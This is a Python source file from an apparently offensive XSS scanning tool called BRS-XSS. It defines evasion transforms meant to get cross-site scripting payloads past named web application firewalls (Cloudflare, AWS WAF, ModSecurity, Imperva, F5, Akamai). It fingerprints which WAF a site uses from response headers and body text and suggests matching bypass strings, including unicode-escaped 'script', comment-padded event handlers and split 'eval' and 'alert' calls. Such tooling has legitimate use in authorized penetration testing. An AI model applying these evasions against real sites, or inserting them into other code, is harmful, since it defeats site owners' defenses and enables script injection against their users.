#!/usr/bin/env python3

"""
BRS-XSS WAF-Specific Evasions

WAF-specific evasion techniques for different security systems.

Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Created: Tue 05 Aug 2025 18:03:16 MSK
Telegram: https://t.me/EasyProTech
"""

import re
from typing import List, Dict, Optional
from .evasion_types import WAFType

from ..utils.logger import Logger

logger = Logger("core.waf_specific_evasions")


class WAFSpecificEvasions:
    """
    WAF-specific evasion techniques for popular security systems.
    
    Supports:
    - CloudFlare
    - AWS WAF
    - ModSecurity
    - Imperva
    - F5 ASM
    - Akamai
    """
    
    def __init__(self):
        """Initialize WAF-specific evasions"""
        
        self.waf_evasions = {
            WAFType.CLOUDFLARE: [
                lambda p: p.replace('script', 'scr<>ipt'),
                lambda p: p.replace('alert', 'ale\\x72t'),
                lambda p: p.replace('()', '/**/(/**/)'),
                lambda p: re.sub(r'on(\w+)', r'on\1/**/=/**/', p),
            ],
            
            WAFType.AWS_WAF: [
                lambda p: p.replace('javascript:', 'java\\u0073cript:'),
                lambda p: p.replace('<script', '<\\u0073cript'),
                lambda p: p.replace('eval', 'this["ev"+"al"]'),
                lambda p: p.replace('alert', 'window["al"+"ert"]'),
            ],
            
            WAFType.MOD_SECURITY: [
                lambda p: p.replace(' ', '/**/'),
                lambda p: p.replace('=', '&#61;'),
                lambda p: re.sub(r'<(\w+)', r'<\1/**/', p),
                lambda p: p.replace('script', 'scr\\u0069pt'),
            ],
            
            WAFType.IMPERVA: [
                lambda p: p.replace('alert', 'top["al"+"ert"]'),
                lambda p: p.replace('(', '/**/\\u0028'),
                lambda p: p.replace(')', '\\u0029/**/'),
                lambda p: p.replace('<script', '<scr\\u0069pt'),
            ],
            
            WAFType.F5_ASM: [
                lambda p: p.replace('javascript:', 'JaVaScRiPt:'),
                lambda p: p.replace('onload', 'OnLoAd'),
                lambda p: p.replace('alert', 'window["alert"]'),
                lambda p: re.sub(r'<(\w+)', r'<\\x\1', p),
            ],
            
            WAFType.AKAMAI: [
                lambda p: p.replace('script', 'ScRiPt'),
                lambda p: p.replace('=', '\\u003d'),
                lambda p: p.replace('()', '\\u0028\\u0029'),
                lambda p: p.replace('<', '\\u003c'),
            ]
        }
        
        logger.debug("WAF-specific evasions initialized")
    
    def apply_waf_specific_evasions(self, payload: str, waf_type: str) -> List[str]:
        """Apply WAF-specific evasion techniques"""
        
        try:
            waf_enum = WAFType(waf_type.lower())
        except ValueError:
            logger.warning(f"Unknown WAF type: {waf_type}")
            return [payload]
        
        if waf_enum not in self.waf_evasions:
            return [payload]
        
        results = [payload]
        evasion_functions = self.waf_evasions[waf_enum]
        
        for evasion_func in evasion_functions:
            try:
                evaded = evasion_func(payload)
                if evaded != payload:
                    results.append(evaded)
            except Exception as e:
                logger.debug(f"WAF evasion failed: {e}")
        
        return results[:5]  # Limit to 5 variations
    
    def get_waf_bypass_patterns(self, waf_type: str) -> Dict[str, str]:
        """Get common bypass patterns for specific WAF"""
        
        patterns = {
            'cloudflare': {
                'script_tag': 'scr<>ipt',
                'event_handler': 'on/**/load',
                'function_call': 'ale\\x72t()',
                'quotes': '\\"',
            },
            
            'aws_waf': {
                'javascript_protocol': 'java\\u0073cript:',
                'script_tag': '<\\u0073cript>',
                'eval_function': 'this["ev"+"al"]',
                'alert_function': 'window["al"+"ert"]',
            },
            
            'mod_security': {
                'whitespace': '/**/',
                'equals': '&#61;',
                'tag_prefix': '<tag/**/',
                'script_unicode': 'scr\\u0069pt',
            },
            
            'imperva': {
                'alert_bracket': 'top["al"+"ert"]',
                'parentheses': '/**/\\u0028\\u0029',
                'script_unicode': '<scr\\u0069pt>',
            }
        }
        
        return patterns.get(waf_type.lower(), {})
    
    def detect_waf_and_suggest_bypasses(self, response_headers: Dict[str, str], 
                                       response_body: str) -> List[str]:
        """Detect WAF and suggest appropriate bypasses"""
        
        bypasses = []
        
        # CloudFlare detection
        if any(header.lower().startswith('cf-') for header in response_headers):
            bypasses.extend([
                'scr<>ipt',
                'ale\\x72t',
                'on/**/load',
                'java/**/script:'
            ])
        
        # AWS WAF detection
        if 'x-amzn-requestid' in response_headers or 'awselb' in str(response_headers):
            bypasses.extend([
                'java\\u0073cript:',
                '<\\u0073cript>',
                'this["ev"+"al"]'
            ])
        
        # ModSecurity detection
        if 'mod_security' in response_body.lower() or 'modsecurity' in response_body.lower():
            bypasses.extend([
                '/**/',
                '&#61;',
                'scr\\u0069pt'
            ])
        
        # Imperva detection
        if 'imperva' in response_body.lower() or 'incapsula' in response_body.lower():
            bypasses.extend([
                'top["al"+"ert"]',
                '/**/\\u0028\\u0029',
                '<scr\\u0069pt>'
            ])
        
        return bypasses